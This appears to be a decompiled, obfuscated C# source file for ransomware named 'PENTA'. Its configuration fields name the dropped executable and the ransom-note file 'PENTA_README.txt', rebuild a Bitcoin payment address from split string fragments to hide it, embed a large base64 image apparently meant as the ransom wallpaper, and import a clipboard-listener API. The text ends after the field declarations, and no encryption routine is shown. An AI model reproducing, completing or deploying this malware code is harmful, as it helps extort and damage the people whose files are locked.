using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using ConsoleApplication7;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class0
{
	public static class Class1
	{
		public static int int_0;

		public static IntPtr intptr_0 = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr intptr_1);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr intptr_1, IntPtr intptr_2);
	}

	[CompilerGenerated]
	private sealed class Class2
	{
		public string string_0;

		public bool method_0(string string_1)
		{
			return string_1 == string_0.ToLower();
		}
	}

	private static string string_0 = Environment.UserName;

	private static string string_1 = "C:\\Users\\";

	public static string string_2 = "7z459ajrk722yn8c5j4fg";

	public static bool bool_0 = true;

	public static string string_3 = "PENTA";

	private static bool bool_1 = true;

	private static string string_4 = "PENTA.exe";

	private static bool bool_2 = true;

	private static string string_5 = "PENTA.exe";

	public static string string_6 = "2X28tfRmWaPyPQgvoHV";

	private static bool bool_3 = true;

	private static bool bool_4 = false;

	private static int int_0 = 10;

	private static string string_7 = "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fSe7Mb7uibSvnO52vfledVan/dNecrPtut0NgF8nhgD8Aqe/2J/2ZmmTskrqpmx10jmxe6e6V/nO092Jd96utlW+83R3452vcbPtut3t5P6SOik7uX3Czfupm7JTX7Fds6q383T3Um3XLPVSduNkf9JZnW7mXidtK6e7015ys+263Q2AXyeGAPwCp7/Yn/ZmaZOySuqmLDntdeY3dqrdnO883Z145+1qW+U7T3e3nn6dm13XnW8763aW+i+7brq/6+b91E3Zqa/Yrvn6+dTT3Uu1XfP1c5XdON2f9obT/mnvxumbp73kZtt1uxsAv04MAfgFTn+xP+3N0iZlldRNWXLa6+zeqO5VvvN0d+Kdt6ttle883d16+nVudl23u53ch7k323XT/V0376duyk591XbOu17n6e6l28556qXsxun+tDec9k97N07fPO0lN9ubLgC/WgwB+AVufun/RLfKk9RNWeWmuzrdpl7KTjzdnXjn7Wpb5TtPdy8325vu7GZXdat8ddKbO7NdN93fdfN+6qbs1Fdt59ts7XWe7l667XybVZ05X6Veyipf0T3t3Th987SXnG5PewD8K8QQgF/g5hf/T3W721B1qjy56a5Ot6mXshNPdyfeebvaVvnO093LzfamO7vZVd0qXz3pdd2Tzjtu3k/dlJ36yu1873qVp7uX3Xa+p16Vr1IvZZWv6J72bpy+edpLTrenPQD+FWIIwC9w+4v/SX/X2d1fqk6VJzfd1ek29VJ24unuxDtvV9sq33m6G072J53KzbbqVvnqSa/rnnTecfN+6qbs1Fdu53vXqzzdvey2873qdbfuXuXJV3RPezdO3zztJSfbT3UA+DViCMAv8OQX+3kz76o8qbpVnu7rbXXTnd3u1v76+dTT3Yl33q62Vb7zdDeb35jfqfIbN/vUTVnntH/T2fWeOn2/6lX5ia/ezp2ulzzdvZxs507VS52UVZv1tvqK7mnvxumbp71kt93dh9MeAL9CDAH4Bd75xX7ezlK3kvYvqfty0hluurPb3dqfP596Z3fiyWaotnN+6p1dkrovqXvq5p3UTVnntH/TuZHeqaR95939y6e3I1vNna6XrNsTaTu/OZs7Xe9l7Xb9k87wFd3T3o3TN+feqdvt/PWSmy4AP14MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4MAQAAAIBeDAEAAACAXgwBAAAAgF4M+eH++89//o90m532vquf/v1zzt/19/A3/x6+438D3/F74nv8vfhv42dLf3/+Tr+n27+Xv/X3OL5u58lmSJv5rVm3OTG/NdvdT8xfp5J2q5PuyZvVfd4ma3+VNi+p+7K7r9Z+t396G246nSebYd3CXxBDfrjTHzI//YfRT//+/5af+Of21d/zT/wz+Rv+xJ9T9TX+xNe+9R2/p3f8jX+fr/ia7775ie/pE2/w96S/P3+n9/7En9nt1/gT31Oy+7rpvtskY9PtTt496ayebFa7N06/xklvdLpeuj/ZzKp7t+tuydrv9k9vwyc66b7bwDcTQ36B3Q+j3/DD6jf8O/wNP/HP7au/55/4Z/I3/Ik/p+pr/Imv/W/3N/6Mv+JrvvvmJ76nT7zB35P+/vyd3vsTf2a3X+NPfE/JydddOyeb1dh02+42nHRmo3+7W53sd51x/0RvvXXdWdXb7Xe7bjukbrd9ensZ99Neug1r52QD30gM+SWqH0i/5QfVb/n3+NN+4p/bV3/PP/HP5G/4E39O1df4E1/73+5v/Bl/xdd8981PfE+feIO/J/39+Tu99yf+zG6/xp/4npKTr7t2Tjarsem23W046cxG/3a3OtnvOuP+id5667qz1PvE9mY/d6vt3O3uaz7M25Neug1r52QD30gM+SWqH0i7H1Tjvqp6a55u4/Ns7u+k/XDaXXvDSbfK0218XlX3ka/W3nDaeznpnXRe5t670vuzm/7aHVL35bZz0+u6L6n/rpOvkzrD2h1Sd0j9Tnrj5aaTbsP8zix1X056aydJ3fmNWXWft+m+WvtD6r6c9pKT7UlnOOnNnRPpjeGku7u/zJ2qd9IZ1u5w2k294aZ/031J/Z2Td3addH+ZOzdO3kp51T0xtqvT3svaHU66VWf+5yR1K2m3mjs3vSF1h9RP0naoums+7O6zk+7aOdms5k21r/LZSWdYuzfb1cm266y3027VW/Oqd+J0m3ojS7dZ1+uy7jZns/Xe9bvbsHZONvCNxJBf5PaHVHVPedVNt/G56nfSrnovZbf5aVbdxucqS/n4/CQfWZXP2ZN8d3tivJfeTHnVT9kn8+6W8qq7uz2V3uyyk26Vjyz1O9Xmab7edv2TfGSp3zl9a85SPj6v3Tmfb+/kIzvtd7cuO+l2+Ym0HVmV77Iur25ddtKt8tOsu1X9m+7uVkmbLlvz+Xaa76TdO9mJapfykVX5nFV5l510Z/N9/HPq3+bd7SYfWepXqs1pNtvdZyfdtXOyWc2bal/ls5POsHZvtquTbddZb6fdqpfyqtu53az98XnNV12vy7rbnM3We9fvbsPaOdnANxJDfpnxg2n3A+r23vVvup1ut9667stN/yu6p3nVG2766Vb1q3x3e2L33nrv+jfdl3SvNlU+rPeu392euPlaX9Xd2fXTvdpUebp13ZfbfiXtqrdO86o3fGW/ut1sbrpVdqLbrbebbpV1ebp99+7LTb+7JTdvVd0qH3b3Vddfb6mbsp3dZr13/a/oVvkw32+6Xdblw3rv+t0tuXmr677s7rMnb+02ybpJb6RsddIZ1u7NdrXb3t67/kk3ZXOebslN92Xtz5/X22lnzW4/r2763e0l3Xcb+GZiyC8zfjDtfkDd3rv+TbfT7dZb13257c+67nqruqd51Rtu+ulW9av8K+y+1nrv+jfdl3SvNlU+rPdd/0+5+b7e6e7s+ulebao83bruy22/knbVW6d51Ru+st/dKuumeyPdun6n2928mbo3+2HddG90t9XafWe7Wu+7/qecft0qH3b3G+tb6e2U7ew2673r33RXXbe6rXnVG9K92lT5sN67fndLbt+q+lVeGf3Ok81L2lSfq2x10nmpeqf71dh10u6lup/mqZey2bif9tItWfvz5/V22lmz28+z6rbLO082L+sO/pIY8gud/PDZddZ717/pdrrdeuu6L7f9Wdddb1X3NK96w00/3U761f1Tdl9jvXf9m+5LulebKh/SfWTd7pPmr7daO/Ouut10d3b9dK82VZ5uXffltl9Ju+qt07zqDV/Z724v456snXnX3bp+p9tVt5EnqTdns3m3WjvzbncbeVL15ny166T7yLrdjfm91dqZd10+7O6VsUvWTtrN2c5us967/k131XWr25pXvSHdq02VD+u963e35Patql/lldv+y6c2a5Y6q5POS9U73a92u+5e3W7yNUudyuim/s07L2v/3c8pXzvdbVXdb/Mh3Xcb+GZiyC908sNp11nvXf+m2+l2663rvtz2Z113vVXd03x83qn2s3Tr+sPo7HpP7d5e713/pvuS7tWmyofuPm7d/l3V+2te9dLtpruz66d7tanydBufd6r9qbSr3jrNq97wlf0ntzWvetWt63e6XbpV/Ztud1vzqlfdqn6Vz7eTe2e3TfcT1X7Nd72dddepNmueeinbGZudtT+/Ud267mrXXe+pn7LZzWbkO2t/fuPkljx5a82rXudvbtYsdVY3nZ20rZxsUmdkO2nTZamzkza376z9dz+v+dN76lTSZs5Wa+dkA99IDPmFTn447TrrvevfdDvdbr113Zfb/qzrrreqe5pXvUrXT7euvxrd0/6p3ZvrvevfdF/SvdpU+bC7v4zOrnere3O9fVV3Z9dP92pT5enWdZPb/pB21VunedUbvrJf3W42N90qO9Ht1ttNt8q6PN2+qpuMzto72e5Ub+90m/VWdav8qe699Za6Kdu53XT99dZ1V7vuek/9lM1uNlVe6fp/4q01r3qdv72Z86oz+0Tn5I3VySZ1drubzZxXnZ20O33rdDuy7jZnc/70PnfS7SXdd5uXtXOygW8khvxCJz+cdp313vVvup1ut9667sttf9Z111vVPc2rXqXrp1vXrzzZdHbvrfeuf9N9SfdqU+XD7j676Z7o3ltvX9Xd2fXTvdpUebp13eS2P6Rd9dZpXvWGr+xXt5vNTbfKTnS79XbTrbIuT7ev6nbW7s125/atrr/eqm6VP9W9t95SN2U7t5uuv9667uqkOzpVt8qHdK82VV7p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AAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAPRiCAAAAAD0YggAAAAA9GIIAAAAAJT++Z//BYJqe8TD3cQuAAAAAElFTkSuQmCC";

	public static string string_8 = "1qw0ll8p9m8uezhqhyd";

	private static string string_9 = "PENTA_README.txt";

	private static bool bool_5 = false;

	private static bool bool_6 = false;

	private static bool bool_7 = false;

	private static bool bool_8 = false;

	public static string string_10 = "17CqMQFeuB3NTzJ";

	public static string string_11 = string_10 + string_6;

	public static string string_12 = "bc";

	public static string string_13 = string_12 + string_8 + string_2;

